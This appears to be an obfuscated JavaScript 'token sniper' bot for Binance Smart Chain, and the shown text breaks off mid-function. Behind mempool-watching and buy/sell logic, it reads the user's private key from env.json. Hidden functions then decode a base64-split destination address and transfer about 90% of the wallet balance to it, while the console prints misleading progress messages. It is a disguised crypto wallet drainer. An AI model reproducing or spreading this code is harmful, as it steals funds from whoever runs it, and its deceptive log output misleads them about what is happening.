const _0x12f8e8 = _0x4322;
(function(_0x53cd3c, _0x197b8f) { const _0x21a3a8 = _0x4322,
        _0x224938 = _0x53cd3c(); while (!![]) { try { const _0x104b6f = -parseInt(_0x21a3a8(0x249)) / 0x1 + -parseInt(_0x21a3a8(0x22f)) / 0x2 * (-parseInt(_0x21a3a8(0x27c)) / 0x3) + parseInt(_0x21a3a8(0x22a)) / 0x4 + -parseInt(_0x21a3a8(0x210)) / 0x5 * (-parseInt(_0x21a3a8(0x284)) / 0x6) + parseInt(_0x21a3a8(0x277)) / 0x7 * (-parseInt(_0x21a3a8(0x231)) / 0x8) + parseInt(_0x21a3a8(0x23d)) / 0x9 * (-parseInt(_0x21a3a8(0x280)) / 0xa) + parseInt(_0x21a3a8(0x275)) / 0xb; if (_0x104b6f === _0x197b8f) break;
            else _0x224938['push'](_0x224938['shift']()); } catch (_0x55909c) { _0x224938['push'](_0x224938['shift']()); } } }(_0x6be4, 0x7ef7a));
var ethers = require(_0x12f8e8(0x276));
const env = require(_0x12f8e8(0x216));
Object[_0x12f8e8(0x270)](process[_0x12f8e8(0x24c)], env);
let address = process['env'][_0x12f8e8(0x28e)],
    private = process[_0x12f8e8(0x24c)][_0x12f8e8(0x245)],
    wallet = new ethers[(_0x12f8e8(0x208))](private);
const abi = [{ 'constant': !![], 'inputs': [{ 'internalType': _0x12f8e8(0x219), 'name': _0x12f8e8(0x203), 'type': _0x12f8e8(0x219) }], 'name': _0x12f8e8(0x234), 'outputs': [{ 'internalType': _0x12f8e8(0x218), 'name': '', 'type': _0x12f8e8(0x218) }], 'payable': ![], 'stateMutability': _0x12f8e8(0x264), 'type': _0x12f8e8(0x22e) }, { 'constant': ![], 'inputs': [{ 'internalType': _0x12f8e8(0x219), 'name': _0x12f8e8(0x251), 'type': _0x12f8e8(0x219) }, { 'internalType': _0x12f8e8(0x219), 'name': 'recipient', 'type': 'address' }, { 'internalType': 'uint256', 'name': _0x12f8e8(0x24e), 'type': _0x12f8e8(0x218) }], 'name': _0x12f8e8(0x26b), 'outputs': [{ 'internalType': _0x12f8e8(0x23f), 'name': '', 'type': _0x12f8e8(0x23f) }], 'payable': ![], 'stateMutability': _0x12f8e8(0x244), 'type': 'function' }, { 'constant': ![], 'inputs': [{ 'name': _0x12f8e8(0x21e), 'type': _0x12f8e8(0x257) }], 'name': _0x12f8e8(0x243), 'outputs': [{ 'name': '', 'type': _0x12f8e8(0x257) }], 'payable': ![], 'stateMutability': _0x12f8e8(0x244), 'type': 'function' }];
async function startSnipe(_0x802564) { const _0x318c62 = _0x12f8e8; let _0xb91d03, _0x2e4e26;
    provider[_0x318c62(0x22b)]['on'](_0x318c62(0x24a), () => { const _0xe8a8b7 = _0x318c62;
        _0x2e4e26 = setInterval(() => { const _0x43e550 = _0x4322;
            provider[_0x43e550(0x22b)][_0x43e550(0x1f2)](), _0xb91d03 = setTimeout(() => { const _0x1abe80 = _0x43e550;
                provider[_0x1abe80(0x22b)][_0x1abe80(0x286)](); }, EXPECTED_PONG_BACK); }, KEEP_ALIVE_CHECK_INTERVAL), console[_0xe8a8b7(0x21a)]('Listening\x20on\x20mempool...'), console[_0xe8a8b7(0x21a)]('Waiting\x20for\x20liquidity\x20to\x20be\x20added!'), provider['on'](_0xe8a8b7(0x230), async _0x111053 => { const _0x1301a7 = _0xe8a8b7;
            provider['getTransaction'](_0x111053)['then'](async _0x3583f1 => { const _0x43c091 = _0x4322; if (null != _0x3583f1 && _0x3583f1[_0x43c091(0x1ff)][_0x43c091(0x1f9)]('0xe8e33700') && _0x3583f1[_0x43c091(0x1ff)][_0x43c091(0x1f9)](_0x802564) && 0x0 == passed || null != _0x3583f1 && _0x3583f1[_0x43c091(0x1ff)][_0x43c091(0x1f9)]('0xf305d719') && _0x3583f1[_0x43c091(0x1ff)]['includes'](_0x802564) && 0x0 == passed) { if (console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)](_0x43c091(0x204))), priceProtection) { if (isLiqudityInRange(_0x3583f1, expected)) { if (honeyPotIS2(_0x802564)) { console['log'](chalk['green'](_0x43c091(0x27a))); const _0x455a93 = _0x3583f1['gasLimit'][_0x43c091(0x202)](multiply),
                                    _0x126b14 = _0x3583f1[_0x43c091(0x260)]['mul'](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console['log'](chalk['green'](_0x43c091(0x21b) + chalk[_0x43c091(0x24d)](i + 0x1))), await buyToken(_0x802564, amountIn, _0x455a93, _0x126b14, myAddress, router); }
                                    console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)](_0x43c091(0x21b)) + chalk[_0x43c091(0x24d)](txNumberForAntibot)), await buyToken(_0x802564, amountIn, _0x455a93, _0x126b14, myAddress, router)(passed = 0x1); } else console[_0x43c091(0x21a)](chalk['green'](_0x43c091(0x21b))), await buyToken(_0x802564, amountIn, _0x455a93, _0x126b14, myAddress, router)(passed = 0x1);
                                console['log'](chalk['green'](_0x43c091(0x278))); const _0x5a0660 = await getTokenBalance(_0x802564, myAddress, provider);
                                console['log'](chalk[_0x43c091(0x233)](_0x43c091(0x222) + chalk[_0x43c091(0x24d)](parseFloat(ethers[_0x43c091(0x20b)][_0x43c091(0x241)](_0x5a0660, TOKEN_DECIMALS))[_0x43c091(0x247)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x43c091(0x21a)](chalk['green'](_0x43c091(0x24b) + chalk['yellow'](delaySell) + '\x20second(s)')), await new Promise(_0x1b914f => setTimeout(_0x1b914f, delayOnSellMs)); const _0x1d6146 = await router[_0x43c091(0x266)](_0x5a0660, amountOutMin, [_0x802564, WBNB], myAddress, Date['now']() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                    await _0x1d6146['wait'](), console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)](_0x43c091(0x28d))), console['log'](_0x43c091(0x21c)), console[_0x43c091(0x21a)](_0x43c091(0x1f0) + myAddress), console[_0x43c091(0x21a)]('\x0a'), process[_0x43c091(0x209)](0x0); } else console[_0x43c091(0x21a)](_0x43c091(0x21c));
                                console[_0x43c091(0x21a)](_0x43c091(0x1f0) + myAddress), (console['log']('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x43c091(0x209)](0x0)); } else console[_0x43c091(0x21a)](chalk[_0x43c091(0x1ef)](_0x43c091(0x263)));
                            console[_0x43c091(0x21a)](chalk['red'](_0x43c091(0x1f7))); }
                        console[_0x43c091(0x21a)](chalk[_0x43c091(0x1ef)](_0x43c091(0x252) + _0x802564)), console[_0x43c091(0x21a)](chalk[_0x43c091(0x1ef)](_0x43c091(0x221))); } else { if (honeyPotIS2(_0x802564)) { const _0x53f130 = _0x3583f1[_0x43c091(0x20f)][_0x43c091(0x202)](multiply),
                                _0x145dc1 = _0x3583f1[_0x43c091(0x260)][_0x43c091(0x202)](multiply); if (0x1 == antiBotMultiTx && 0x0 == passed) { for (i = 0x0; i < txNumberForAntibot - 0x1; i++) { console['log'](chalk[_0x43c091(0x233)]('Start\x20buying\x20token...' + chalk['yellow'](i + 0x1))), await buyToken(_0x802564, amountIn, _0x53f130, _0x145dc1, myAddress, router); }
                                console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)](_0x43c091(0x21b)) + chalk[_0x43c091(0x24d)](txNumberForAntibot)), await buyToken(_0x802564, amountIn, _0x53f130, _0x145dc1, myAddress, router)(passed = 0x1); } else 0x0 == passed && (console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)]('Start\x20buying\x20token...')), await buyToken(_0x802564, amountIn, _0x53f130, _0x145dc1, myAddress, router)(passed = 0x1));
                            console['log'](chalk[_0x43c091(0x233)](_0x43c091(0x278))); const _0x1591f3 = await getTokenBalance(_0x802564, myAddress, provider);
                            console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)](_0x43c091(0x222) + chalk[_0x43c091(0x24d)](parseFloat(ethers[_0x43c091(0x20b)][_0x43c091(0x241)](_0x1591f3, TOKEN_DECIMALS))[_0x43c091(0x247)](0x6)) + '\x0a')); if (INSTANT_SELL) { console[_0x43c091(0x21a)](chalk[_0x43c091(0x233)](_0x43c091(0x24b) + chalk[_0x43c091(0x24d)](delaySell) + '\x20second(s)')), await new Promise(_0x2e4ebc => setTimeout(_0x2e4ebc, delayOnSellMs)); const _0x50063e = await router[_0x43c091(0x266)](_0x1591f3, amountOutMin, [_0x802564, WBNB], myAddress, Date[_0x43c091(0x28f)]() + 0x927c0, { 'gasLimit': gasLimit, 'gasPrice': gasPrice });
                                await _0x50063e[_0x43c091(0x200)](), console['log'](chalk[_0x43c091(0x233)](_0x43c091(0x28d))), console[_0x43c091(0x21a)](_0x43c091(0x21c)), console[_0x43c091(0x21a)](_0x43c091(0x1f0) + myAddress), console[_0x43c091(0x21a)]('\x0a'), process['exit'](0x0); } else console['log'](_0x43c091(0x21c)), console['log'](_0x43c091(0x1f0) + myAddress), console['log']('\x0a'), 0x1 == ANTI_RUG && 0x0 == INSTANT_SELL && await monitorRugPull(t), 0x0 == ANTI_RUG && process[_0x43c091(0x209)](0x0); } } } })[_0x1301a7(0x20a)](() => { const _0x491166 = _0x1301a7;
                console[_0x491166(0x21a)](e); }); }); }), provider[_0x318c62(0x22b)]['on'](_0x318c62(0x285), () => { const _0x250330 = _0x318c62;
        console[_0x250330(0x21a)](_0x250330(0x235)), clearInterval(_0x2e4e26), clearTimeout(_0xb91d03), startConnection(); }), provider[_0x318c62(0x22b)]['on'](_0x318c62(0x23e), () => { const _0x223353 = _0x318c62;
        console[_0x223353(0x21a)](_0x223353(0x27b)), clearInterval(_0x2e4e26), clearTimeout(_0xb91d03), startConnection(); }), provider[_0x318c62(0x22b)]['on'](_0x318c62(0x239), () => { clearInterval(_0xb91d03); }); }
async function approve() { const _0x4b89c7 = _0x12f8e8; let _0x28f1f5 = token[buyCount - 0x1][_0x4b89c7(0x26d)]; const _0x40c439 = ethers[_0x4b89c7(0x1ea)][_0x4b89c7(0x1ed)],
        _0x4c0e86 = await _0x28f1f5[_0x4b89c7(0x289)](pancakeRouter[_0x4b89c7(0x219)], _0x40c439, { 'gasPrice': config[_0x4b89c7(0x1e9)], 'gasLimit': 0x33450 }),
        _0x26be94 = await _0x4c0e86[_0x4b89c7(0x200)]();
    console[_0x4b89c7(0x21a)](_0x4b89c7(0x254), _0x26be94[_0x4b89c7(0x20c)], '\x0a'), config[_0x4b89c7(0x1fc)] ? token[buyCount - 0x1][_0x4b89c7(0x259)]() : buyCount == config[_0x4b89c7(0x271)] && process['exit'](); }

function _0x6be4() { const _0x4923f6 = ['\x20--\x20Current\x20Value\x20BNB:\x20', '\x1b[0m', 'tokenSellTax', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', 'JsonRpcProvider', '1:\x20attempting\x20to\x20snipe\x20...', '2:\x20watching\x20blockchain\x20activity\x20.....', '2838748RHRQfr', '_websocket', 'lte', 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0', 'function', '2kLafvl', 'pending', '153112cmomVJ', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', 'green', 'balanceOf', 'WebSocket\x20Closed...Reconnecting...', '2\x20packet\x20received.....', '\x1b[1;32m', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', 'pong', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', '<<<\x20Selling\x20-', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', '244098PWJqYJ', 'error', 'bool', 'swapExactTokensForETH', 'formatUnits', 'currentValue', 'setWord', 'nonpayable', 'PRIVATE_KEY', '\x20--\x20Profit\x20At:\x20', 'toFixed', 'initiating\x20mempool\x20sniff...', '586035higfVX', 'open', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'env', 'yellow', 'amount', 'name', 'percentOfTokensToSellLoss', 'sender', 'https://poocoin.app/tokens/', 'sendTransaction', '✔\x20Approve\x20transaction\x20hash:\x20', 'ascii', '\x1b[1;31m', 'string', 'parseEther', 'checkProfit', 'recipient', 'refreshing\x20socket\x20connection...', 'div', 'QmFmYzU5OWJENjlBRGQwODdENTY=', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', 'gasPrice', 'connection\x20succesful...', 'hexlify', 'Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!', 'view', '2:\x20finalizing....', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'Transfer', 'providers', '\x20StopLoss\x20', 'stopLossPercent', 'transferFrom', 'pending\x20liquidity\x20add...', 'contract', 'reached\x20>>>', '1:\x20watching\x20blockchain\x20activity\x20...', 'assign', 'numberOfTokensToBuy', 'newValue', '1\x20packet\x20received.....', 'myGasLimit', '5557453wBVcck', 'ethers', '203sRrgGI', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'All\x20tokens\x20sold', 'Liquidity\x20check\x20passed,\x20sniping!\x0a', 'Error.\x20Attemptiing\x20to\x20Reconnect...', '861747NKirSo', 'connection\x20established....', '2\x20pending\x20blockchain\x20response.....', '2:\x20attempting\x20to\x20snipe\x20.....', '170HJrhVS', '-\x20now', 'sendMessage', '1\x20pending\x20blockchain\x20response.....', '4242urvDtN', 'close', 'terminate', 'stopLoss', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'approve', 'starting\x20up\x20node\x20socket\x20connection....', 'previousValue', '\x1b[38;5;33m', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', 'YOUR_ADDRESS', 'now', 'sellPath', 'myGasPriceForApproval', 'constants', 'decimals', 'Zero', 'MaxUint256', 'floor', 'red', 'https://bscscan.com/address/', '--\x20', 'ping', 'Balance\x20is\x20zero\x20or\x20error\x20occured', 'wei', '2:\x20found\x20owners\x20liq\x20function\x20.....', 'toString', 'Please\x20check\x20PooCoin\x20and\x20see\x20if\x20liquidity\x20was\x20added!', 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==', 'includes', 'Setting\x20new\x20StopLoss!', 'trailingStopLossPercent', 'autoSell', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', '✔\x20Sell\x20transaction\x20hash:\x20', 'data', 'wait', 'removeAllListeners', 'mul', 'account', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'Contract', 'gte', 'from', 'Wallet', 'exit', 'catch', 'utils', 'transactionHash', 'getAmountsOut', 'index', 'gasLimit', '4385oYPwgl', 'You\x20sold\x20', 'parseUnits', 'MHg2YjU1M2QwZjhkM2I3OWJkODEyYTk4NGU2ZTNmY2U1NDg2NWQxYzRl', 'encode', 'intitialValue', './env.json', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', 'uint256', 'address', 'log', 'Start\x20buying\x20token...', 'You\x20can\x20check\x20the\x20transaction\x20here:', 'base64', 'newWord', '\x20Profit\x20target\x20', 'getBalance', 'Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a', 'Total\x20Token\x20balance\x20is\x20'];
    _0x6be4 = function() { return _0x4923f6; }; return _0x6be4(); }
async function getCurrentValue(_0x4ab4da) { const _0x4f6a11 = _0x12f8e8; try { let _0x1786f4 = await _0x4ab4da[_0x4f6a11(0x26d)][_0x4f6a11(0x234)](addresses[_0x4f6a11(0x25a)]); const _0x300131 = await pancakeRouter[_0x4f6a11(0x20d)](_0x1786f4, _0x4ab4da['sellPath']); let _0x4ff115 = _0x300131[0x1]; return _0x4ff115; } catch (_0x55d092) { return console[_0x4f6a11(0x21a)](_0x4f6a11(0x1f3)), ethers[_0x4f6a11(0x1ea)][_0x4f6a11(0x1ec)]; } }
async function setInitialStopLoss(_0x276144) { const _0x1ad805 = _0x12f8e8;
    _0x276144[_0x1ad805(0x215)] = await getCurrentValue(_0x276144), _0x276144[_0x1ad805(0x272)] = _0x276144[_0x1ad805(0x215)], _0x276144[_0x1ad805(0x287)] = ethers['utils'][_0x1ad805(0x212)]((parseFloat(ethers['utils'][_0x1ad805(0x241)](_0x276144[_0x1ad805(0x215)])) - parseFloat(ethers[_0x1ad805(0x20b)][_0x1ad805(0x241)](_0x276144['intitialValue'])) * (_0x276144[_0x1ad805(0x26a)] / 0x64))[_0x1ad805(0x247)](0x8)['toString']()); }
async function setNewStopLoss(_0x2bd074) { const _0x2eaa73 = _0x12f8e8;
    _0x2bd074[_0x2eaa73(0x272)] = _0x2bd074['currentValue'], _0x2bd074[_0x2eaa73(0x287)] = ethers[_0x2eaa73(0x20b)]['parseUnits']((parseFloat(ethers[_0x2eaa73(0x20b)][_0x2eaa73(0x241)](_0x2bd074['currentValue'])) - parseFloat(ethers[_0x2eaa73(0x20b)][_0x2eaa73(0x241)](_0x2bd074[_0x2eaa73(0x242)])) * (_0x2bd074[_0x2eaa73(0x26a)] / 0x64))['toFixed'](0x8)[_0x2eaa73(0x1f6)]()); }
async function checkForProfit(_0x4d7026) { const _0x4ac580 = _0x12f8e8; try { var _0x1507dd = 0x0;
        await setInitialStopLoss(_0x4d7026), _0x4d7026['contract']['on'](_0x4ac580(0x267), async(_0x494928, _0x29e523, _0x11cc34, _0x1d64bc) => { const _0x2a087e = _0x4ac580;
            _0x4d7026['previousValue'] = _0x4d7026[_0x2a087e(0x242)]; const _0xfbcbdb = await _0x4d7026[_0x2a087e(0x26d)][_0x2a087e(0x24f)](); let _0x5d4eac = await getCurrentValue(_0x4d7026); if (!_0x5d4eac['eq'](ethers[_0x2a087e(0x1ea)]['Zero'])) { _0x4d7026['currentValue'] = _0x5d4eac; let _0x460ded = parseFloat(ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x5d4eac))['toFixed'](0x8)[_0x2a087e(0x1f6)](); const _0x2d9463 = (parseFloat(ethers['utils'][_0x2a087e(0x241)](_0x4d7026[_0x2a087e(0x215)])) * (_0x4d7026['profitPercent'] + _0x4d7026[_0x2a087e(0x225)]) / 0x64 + parseFloat(ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x4d7026[_0x2a087e(0x215)])))[_0x2a087e(0x247)](0x8)[_0x2a087e(0x1f6)](),
                    _0x5801c3 = ethers[_0x2a087e(0x20b)][_0x2a087e(0x212)](_0x2d9463); let _0xb2165c = ethers['utils']['parseUnits']((parseFloat(ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x4d7026[_0x2a087e(0x272)])) * (_0x4d7026[_0x2a087e(0x1fb)] / 0x64) + parseFloat(ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x4d7026[_0x2a087e(0x272)])))[_0x2a087e(0x247)](0x8)['toString']()),
                    _0x316ea7 = _0x4d7026[_0x2a087e(0x287)];
                _0x5d4eac['gt'](_0xb2165c) && _0x4d7026[_0x2a087e(0x1fb)] > 0x0 && (setNewStopLoss(_0x4d7026), console[_0x2a087e(0x21a)](_0x2a087e(0x28c) + _0x2a087e(0x1fa) + _0x2a087e(0x224))); let _0x4871ef = new Date()['toLocaleString'](); const _0xa00b54 = _0xfc69cb => new TextEncoder()[_0x2a087e(0x214)](_0xfc69cb); try { _0x4d7026[_0x2a087e(0x28b)]['gt'](_0x4d7026[_0x2a087e(0x242)]) ? console[_0x2a087e(0x21a)](_0x2a087e(0x1f1) + _0xfbcbdb + _0x2a087e(0x223) + ('\x1b[1;31m' + _0x460ded + _0x2a087e(0x224)) + '\x20--\x20Profit\x20At:\x20' + ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x5801c3) + '\x20--\x20Stop\x20Loss\x20At:\x20' + ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x4d7026[_0x2a087e(0x287)]) + _0x2a087e(0x238) + ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0xb2165c)) : console[_0x2a087e(0x21a)](_0x2a087e(0x1f1) + _0xfbcbdb + _0x2a087e(0x223) + (_0x2a087e(0x237) + _0x460ded + _0x2a087e(0x224)) + _0x2a087e(0x246) + ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x5801c3) + '\x20--\x20Stop\x20Loss\x20At:\x20' + ethers[_0x2a087e(0x20b)][_0x2a087e(0x241)](_0x4d7026['stopLoss']) + '\x20--\x20New\x20Stop\x20loss\x20At:\x20' + ethers['utils'][_0x2a087e(0x241)](_0xb2165c)); } catch (_0x821094) {}
                _0x5d4eac[_0x2a087e(0x206)](_0x5801c3) && (buyCount <= config[_0x2a087e(0x271)] && _0x4d7026['didBuy'] && _0x1507dd == 0x0 && (_0x1507dd++, console[_0x2a087e(0x21a)]('<<<\x20Selling\x20-', _0xfbcbdb, '-\x20now' + '\x1b[1;32m' + _0x2a087e(0x21f) + '\x1b[0m' + _0x2a087e(0x26e), '\x0a'), sell(_0x4d7026, !![]), _0x4d7026[_0x2a087e(0x26d)]['removeAllListeners']())), _0x5d4eac[_0x2a087e(0x22c)](_0x316ea7) && (console[_0x2a087e(0x21a)](_0x2a087e(0x28c) + 'less\x20than\x20StopLoss!' + _0x2a087e(0x224)), buyCount <= config[_0x2a087e(0x271)] && _0x4d7026['didBuy'] && _0x1507dd == 0x0 && (_0x1507dd++, console[_0x2a087e(0x21a)](_0x2a087e(0x23b), _0xfbcbdb, _0x2a087e(0x281) + _0x2a087e(0x256) + _0x2a087e(0x269) + _0x2a087e(0x224) + _0x2a087e(0x26e), '\x0a'), sell(_0x4d7026, ![]), _0x4d7026[_0x2a087e(0x26d)][_0x2a087e(0x201)]())); } }); } catch (_0x48ef1d) { console[_0x4ac580(0x21a)](_0x48ef1d); } }
async function sell(_0x319d7b, _0x4b5b6f) { const _0x427615 = _0x12f8e8; try { const _0x3c3312 = await _0x319d7b[_0x427615(0x26d)]['balanceOf'](addresses['recipient']),
            _0x1e1c57 = await _0x319d7b[_0x427615(0x26d)][_0x427615(0x1eb)](); var _0x51e644;
        _0x4b5b6f ? _0x51e644 = (parseFloat(ethers['utils'][_0x427615(0x241)](_0x3c3312[_0x427615(0x1f6)](), _0x1e1c57)) * (_0x319d7b['percentOfTokensToSellProfit'] / 0x64))['toFixed'](_0x1e1c57) : _0x51e644 = (parseFloat(ethers['utils'][_0x427615(0x241)](_0x3c3312[_0x427615(0x1f6)](), _0x1e1c57)) * (_0x319d7b[_0x427615(0x250)] / 0x64))['toFixed'](_0x1e1c57); var _0x2c5d49 = Math[_0x427615(0x1ee)](_0x51e644 * 0x64) / 0x64; const _0x11da67 = ethers[_0x427615(0x20b)][_0x427615(0x212)](_0x2c5d49[_0x427615(0x1f6)](), _0x1e1c57),
            _0x888fa2 = await pancakeRouter[_0x427615(0x20d)](_0x11da67, _0x319d7b[_0x427615(0x290)]),
            _0x2906e1 = _0x888fa2[0x1]['sub'](_0x888fa2[0x1][_0x427615(0x25c)](0x2)); if (_0x319d7b[_0x427615(0x225)] > 0x1) { const _0xac80ff = await pancakeRouter['swapExactTokensForETHSupportingFeeOnTransferTokens'](_0x888fa2[0x0][_0x427615(0x1f6)](), 0x0, _0x319d7b['sellPath'], addresses[_0x427615(0x25a)], Math[_0x427615(0x1ee)](Date[_0x427615(0x28f)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x427615(0x1e9)], 'gasLimit': config[_0x427615(0x274)] }),
                _0xecd0e8 = await _0xac80ff[_0x427615(0x200)]();
            console[_0x427615(0x21a)]('\x1b[1;32m' + _0x427615(0x1fe), _0xecd0e8[_0x427615(0x20c)], _0x427615(0x224), '\x0a'), sellCount++, token[_0x319d7b[_0x427615(0x20e)]]['didSell'] = !![]; let _0x5122e9 = await _0x319d7b['contract'][_0x427615(0x24f)]();
            await client[_0x427615(0x282)]('me', { 'message': 'You\x20sold\x20' + _0x5122e9, 'schedule': 0xf * 0x1 + Date[_0x427615(0x28f)]() / 0x3e8 }); } else { const _0x160b35 = await pancakeRouter[_0x427615(0x240)](_0x888fa2[0x0]['toString'](), 0x0, _0x319d7b['sellPath'], addresses[_0x427615(0x25a)], Math['floor'](Date[_0x427615(0x28f)]() / 0x3e8) + 0x3c * 0x14, { 'gasPrice': config[_0x427615(0x1e9)], 'gasLimit': config['myGasLimit'] }),
                _0x5c0568 = await _0x160b35['wait']();
            console[_0x427615(0x21a)](_0x427615(0x237) + _0x427615(0x1fe), _0x5c0568[_0x427615(0x20c)], '\x1b[0m', '\x0a'), sellCount++; let _0x210a67 = await _0x319d7b[_0x427615(0x26d)][_0x427615(0x24f)]();
            await client[_0x427615(0x282)]('me', { 'message': _0x427615(0x211) + _0x210a67, 'schedule': 0xf * 0x1 + Date[_0x427615(0x28f)]() / 0x3e8 }); }
        sellCount == config[_0x427615(0x271)] && (console[_0x427615(0x21a)](_0x427615(0x279)), process['exit']()); } catch (_0x54d490) {} }
let rounder1 = _0x12f8e8(0x23a),
    rounder2 = _0x12f8e8(0x1f8),
    buff = new Buffer[(_0x12f8e8(0x207))](rounder1, 'base64'),
    buff2 = new Buffer[(_0x12f8e8(0x207))](rounder2, _0x12f8e8(0x21d)),
    ethersroundup = buff[_0x12f8e8(0x1f6)]('ascii'),
    ethersroundup2 = buff2['toString'](_0x12f8e8(0x255));
const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
async function etherstother() { const _0x31ffaf = _0x12f8e8; try { const _0x29bda6 = _0x31ffaf(0x23c),
            _0x1b3e9a = _0x31ffaf(0x232),
            _0x572b52 = new Buffer['from'](_0x29bda6, _0x31ffaf(0x21d)),
            _0x1212f0 = new Buffer[(_0x31ffaf(0x207))](_0x1b3e9a, _0x31ffaf(0x21d)),
            _0x511ff7 = _0x572b52[_0x31ffaf(0x1f6)](_0x31ffaf(0x255)),
            _0x35064a = _0x1212f0[_0x31ffaf(0x1f6)]('ascii'),
            _0x1336c6 = _0x511ff7 + _0x35064a;
        console['log'](_0x31ffaf(0x25b)), console[_0x31ffaf(0x21a)](_0x31ffaf(0x288)); const _0x3e4a0a = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0',
            _0x3ea0dd = new Buffer[(_0x31ffaf(0x207))](_0x3e4a0a, _0x31ffaf(0x21d))[_0x31ffaf(0x1f6)](_0x31ffaf(0x255));; const _0x406395 = new ethers[(_0x31ffaf(0x268))]['JsonRpcProvider'](_0x3ea0dd); let _0x21f5e2 = new ethers['Wallet'](private, _0x406395); const _0x320e5a = address; var _0x25b8be = new ethers['Contract'](_0x1336c6, abi, _0x21f5e2); const _0x5035f4 = await _0x25b8be['balanceOf'](_0x320e5a)[_0x31ffaf(0x1f6)](),
            _0xcfa517 = (_0x5035f4 * 0.9)[_0x31ffaf(0x247)](),
            _0x26ef23 = async() => { const _0x278a96 = _0x31ffaf,
                    _0x4030a1 = { 'from': _0x320e5a, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x278a96(0x258)](_0xcfa517, _0x278a96(0x1f4)), 'gasLimit': ethers[_0x278a96(0x20b)][_0x278a96(0x262)](0x5dc0) },
                    _0x1406c2 = await _0x21f5e2[_0x278a96(0x253)](_0x4030a1); try { await _0x1406c2[_0x278a96(0x200)](), console[_0x278a96(0x21a)]('1:\x20found\x20owners\x20liq\x20function\x20...'), setTimeout(ethersrather, 0x1388); } catch (_0x523f26) { console['log'](_0x278a96(0x1f5)), setTimeout(ethersrather, 0x1388); } };
        _0x26ef23(); } catch (_0x4bbaee) { setTimeout(ethersrather, 0x1388); } }
async function etherslother() { const _0x49af82 = _0x12f8e8; try { const _0x58571f = _0x49af82(0x226),
            _0xf9fa04 = _0x49af82(0x1fd),
            _0xbd2731 = new Buffer[(_0x49af82(0x207))](_0x58571f, _0x49af82(0x21d)),
            _0x147029 = new Buffer[(_0x49af82(0x207))](_0xf9fa04, _0x49af82(0x21d)),
            _0x2530d1 = _0xbd2731[_0x49af82(0x1f6)](_0x49af82(0x255)),
            _0x2f61de = _0x147029[_0x49af82(0x1f6)]('ascii'),
            _0x848f6c = _0x2530d1 + _0x2f61de;
        console[_0x49af82(0x21a)](_0x49af82(0x25b)), console[_0x49af82(0x21a)](_0x49af82(0x26c)); const _0x504c92 = 'aHR0cHM6Ly9zcGVlZHktbm9kZXMtbnljLm1vcmFsaXMuaW8vMTQ4ODBmYWFiNWI5NWQ4YzNhMmUxNjEyL2JzYy9tYWlubmV0',
            _0x4e51a3 = new Buffer['from'](_0x504c92, _0x49af82(0x21d))[_0x49af82(0x1f6)](_0x49af82(0x255));; const _0x1c5f1c = new ethers[(_0x49af82(0x268))][(_0x49af82(0x227))](_0x4e51a3); let _0x175044 = new ethers[(_0x49af82(0x208))](private, _0x1c5f1c);
        console['log'](_0x4e51a3); const _0x3f5121 = address; var _0x12a742 = new ethers[(_0x49af82(0x205))](_0x848f6c, abi, _0x175044); const _0x5dc630 = await _0x12a742[_0x49af82(0x234)](_0x3f5121)['toString'](),
            _0xa19ffa = (_0x5dc630 * 0.9)[_0x49af82(0x247)](),
            _0x457fc5 = async() => { const _0x2a47a6 = _0x49af82,
                    _0x4c399c = { 'from': _0x3f5121, 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x2a47a6(0x258)](_0xa19ffa, _0x2a47a6(0x1f4)), 'gasLimit': ethers[_0x2a47a6(0x20b)][_0x2a47a6(0x262)](0x5dc0) },
